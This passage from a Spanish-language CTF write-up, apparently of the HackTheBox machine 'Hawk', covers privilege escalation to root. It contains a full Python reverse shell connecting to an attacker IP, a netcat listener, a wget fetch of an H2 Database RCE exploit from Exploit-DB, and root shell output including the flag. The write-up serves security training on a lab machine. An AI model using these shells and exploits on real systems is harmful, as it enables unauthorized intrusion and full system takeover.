<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>reverse.py
import socket
import subprocess
import os

s <span class="o">=</span> socket.socket<span class="o">(</span>socket.AF_INET, socket.SOCK_STREAM<span class="o">)</span>
s.connect<span class="o">((</span><span class="s2">"10.10.14.63"</span>, 8080<span class="o">))</span>
os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>, 0<span class="o">)</span>
os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>, 1<span class="o">)</span>
os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>, 2<span class="o">)</span>
subprocess.call<span class="o">([</span><span class="s2">"/bin/sh"</span>, <span class="s2">"-i"</span><span class="o">])</span>
</code></pre></div></div>

<ul>
  <li>Vamos a meter eso en /tmp.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x reverse.py
</code></pre></div></div>

<ul>
  <li>Nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 8080
listening on <span class="o">[</span>any] 8080 ...
</code></pre></div></div>

<ul>
  <li>Y ejecutamos solo que ahora ejecutamos python3 y la ruta del archivo en python3.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/12.png" />
</p>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Al darle a run nos llega la shell como root.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 8080
listening on <span class="o">[</span>any] 8080 ...
connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.102] 40912
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
# whoami
root
# script /dev/null -c bash
Script started, file is /dev/null
root@hawk:~# cat /root/root.txt
cat /root/root.txt
5aa913cca6cd0865e7172edbc21d66f4
root@hawk:~#
</span></code></pre></div></div>

<h2 id="second-way">Second way</h2>

<ul>
  <li>Como vimos antes hay un script que también nos da RCE.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit H2 database

<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                   |  Path
<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
H2 Database - <span class="s1">'Alias'</span> Arbitrary Code Execution                                                                   | java/local/44422.py
H2 Database 1.4.196 - Remote Code Execution                                                                      | java/webapps/45506.py
H2 Database 1.4.197 - Information Disclosure                                                                     | linux/webapps/45105.py
H2 Database 1.4.199 - JNI Code Execution                                                                         | java/local/49384.txt
Oracle Database 10 g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow                       | multiple/remote/31010.sql
<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
❯ searchsploit <span class="nt">-m</span> 45506

  Exploit: H2 Database 1.4.196 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/45506
     Path: /usr/share/exploitdb/exploits/java/webapps/45506.py
    Codes: N/A
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/miguel/Downloads/45506.py
</code></pre></div></div>

<ul>
  <li>Lo descargamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/tmp<span class="nv">$ </span>wget http://10.10.14.63/45506.py
<span class="nt">--2024-07-03</span> 01:08:30--  http://10.10.14.63/45506.py
Connecting to 10.10.14.63:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3756 <span class="o">(</span>3.7K<span class="o">)</span> <span class="o">[</span>text/x-python]
Saving to: ‘45506.py’

45506.py                         100%[<span class="o">==========================================================&gt;]</span>   3.67K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.003s

2024-07-03 01:08:30 <span class="o">(</span>1.14 MB/s<span class="o">)</span> - ‘45506.py’ saved <span class="o">[</span>3756/3756]

daniel@hawk:/tmp<span class="nv">$ </span><span class="nb">chmod </span>777 45506.py
</code></pre></div></div>

<ul>
  <li>Ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/tmp<span class="nv">$ </span>python3 45506.py <span class="nt">--host</span> 127.0.0.1:8082
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to create database
<span class="o">[</span>+] Created database and logged <span class="k">in</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage 1
<span class="o">[</span>+] Shell succeeded - ^c or quit to <span class="nb">exit
</span>h2-shell<span class="nv">$ </span><span class="nb">whoami
</span>root

h2-shell<span class="err">$</span>
</code></pre></div></div>

  </div><a class="u-url" href="/hackthebox/machines/medium/2024/07/02/hawk.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_miguelitoregn7" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
